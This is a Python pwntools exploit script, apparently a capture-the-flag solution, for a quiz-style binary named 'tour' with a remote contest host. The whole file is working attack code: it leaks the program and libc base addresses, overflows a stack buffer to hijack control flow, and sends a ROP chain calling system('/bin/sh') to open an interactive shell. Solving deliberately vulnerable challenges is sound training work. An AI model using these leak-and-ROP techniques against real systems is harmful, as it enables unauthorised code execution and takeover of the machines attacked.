from pwn import *

exe = ELF('./tour_patched')
libc = ELF('./libc.so.6')

context.arch = "amd64"
gdb_script = """

"""

def conn():
    if args.REMOTE:
        return remote('cybergon2023.webhop.me', 5005)
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p, gdb_script)
    return p

io = conn()
io.sendline(b"flag.txt")
io.sendline(b"1")
io.sendline(b"c"*8 + b"\xE7")
io.recv()
io.sendline(b"2")
io.recvuntil(b"--------------------------------------------------------------\nChoose what to do:")
io.sendline(str(u64(b"\x00\x00\x00\x00\x00\x00\x00\x01")).encode())
io.recvuntil(b"Your boarding pass is: \n")
boarding_pass = io.recvline().strip()
info("boarding_pass: %s", boarding_pass)

offset = cyclic_find(0x61616861616167)

ans = [
    b"Daw Aung San Suu Kyi",
    b"135",
    b"Hkakabo Razi",
    b"Shan State"    
]

io.sendline(b"3")
io.sendline(b"3")
io.sendline(b"2")

io.recvuntil(b"These are your answers: \n")
leak = io.readline().strip()
leak = u64(leak.ljust(8, b"\x00"))
exe.address = leak - 15832
info(hex(exe.address))
io.sendline(b"1")
for a in ans:
    io.sendline(a)

io.sendline(b"4")
io.sendline(b"4")
io.sendline(boarding_pass.strip())

io.sendline(cyclic(offset) + p64(exe.address + 0x194E)) #quizz_time:42

io.sendline(b"2")

offset2 = cyclic_find(0x6165616161646161)
ret = 0x0000000000001016 + exe.address
io.recvuntil(b"Who is the State Counsellor of Myanmar?\n")
io.sendline(b"aaaa")
io.sendline(b"aaaa")
io.sendline(b"aaaa")
io.sendline(cyclic(offset2) + p64(exe.sym.quizz_time) + p64(ret) + p64(exe.sym.menu))
#libc offset 2202272

io.recvuntil(b"Choose: ")
io.sendline(b"3")
io.sendline(b"2")
io.recvuntil(b"These are your answers: \n")
leak = io.readline().strip()
leak = u64(leak.ljust(8, b"\x00")) - 2202272
libc.address = leak
info(hex(libc.address))


rop = ROP(libc)
rop.ret.address
rop.system(next(libc.search(b"/bin/sh\x00")))
payload = flat(
    cyclic(offset2),
    rop.chain()
)
io.sendline(b"4")
io.sendline(b"fuckthis")
io.sendline(b"2")
io.recvuntil(b"Who is the State Counsellor of Myanmar?\n")
io.sendline(b"aaaa")
io.sendline(b"aaaa")
io.sendline(b"aaaa")
io.sendline(payload)
io.interactive()